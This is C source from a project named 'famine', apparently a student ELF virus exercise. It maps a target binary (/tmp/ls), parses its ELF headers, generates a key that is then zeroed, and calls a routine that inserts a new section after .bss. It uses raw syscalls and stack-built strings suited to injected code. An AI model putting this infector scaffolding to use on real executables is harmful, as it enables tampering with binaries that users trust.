#include "famine.h"

void	exit_clean(struct s_woody *woody, int exit_status) {
	if (syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size + BYTECODE_SIZE) == -1)
		ERROR_SYS(((char []){'m','u','n','m','a','p','\0'}));
	syscall_wrapper(__NR_exit, exit_status);
}

void	exit_woody_mod(struct s_woody *woody) {
	if (syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size + BYTECODE_SIZE) == -1)
		ERROR_SYS(((char []){'m','u','n','m','a','p','\0'}));
}

bool	map_file(char *elf_filename, struct s_woody *woody) {
	int		fd;
	uint64_t	size_mmap;
	char		buff[4096];
	ssize_t		bytes_read;
	void		*ptr;

	if ((fd = syscall_wrapper(__NR_open, elf_filename, O_RDWR)) == -1) {
		ERROR_SYS(((char []){'o','p','e','n','\0'}));
		return (false);
	}

	if (syscall_wrapper(__NR_fstat, fd, &woody->bin_st) == -1) {
		ERROR_SYS(((char []){'f','s','t','a','t','\0'}));
		syscall_wrapper(__NR_close, fd);
		return (false);
	}

	size_mmap = ((woody->bin_st.st_size + BYTECODE_SIZE) / PAGE_SIZE + 1) * PAGE_SIZE; // Add bytecode size for 1 call with mmap and munmap
	if ((woody->bin_map = (void *)syscall_wrapper(__NR_mmap, NULL, size_mmap, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		ERROR_SYS(((char []){'m','m','a','p','\0'}));
		syscall_wrapper(__NR_close, fd);
		return (false);
	}

	ptr = woody->bin_map;
	while ((bytes_read = syscall_wrapper(__NR_read, fd, buff, sizeof(buff))) > 0) {
		ft_memcpy(ptr, buff, bytes_read);
		ptr += bytes_read;
	}

	syscall_wrapper(__NR_close, fd);
	if (bytes_read == -1) {
		ERROR_SYS(((char []){'r','e','a','d','\0'}));
		return (false);
	}
	return (true);
}

void	gen_random_key(struct s_woody *woody, struct s_key *key) {
	long key_length;

	if ((key_length = syscall_wrapper(__NR_getrandom, key->raw, KEY_SIZE, 0)) <= -1) {
		ERROR_SYS(((char []){'g','e','t','r','a','n','d','o','m','\0'}));
		exit_clean(woody, EXIT_FAILURE);
	}
	key->length = (size_t)key_length;
	key->raw[0] = 0;
	key->length = 0;
}

void	woody_mod_c_entry() {
	struct s_famine	famine;

	famine.woody.target = (char []){'/','t','m','p','/','l','s','\0'};
	if (!map_file(famine.woody.target, &famine.woody))
		syscall_wrapper(__NR_exit, EXIT_FAILURE);

	read_elf_header(&famine.woody);
	check_headers_offset(&famine.woody);
	get_shstrtab(&famine.woody);

	gen_random_key(&famine.woody, &famine.woody.key);

	insert_section_after_bss(&famine.woody);

	exit_woody_mod(&famine.woody);
}

void	_start()
{
	woody_mod_c_entry();
	syscall_wrapper(__NR_exit, EXIT_SUCCESS);
}
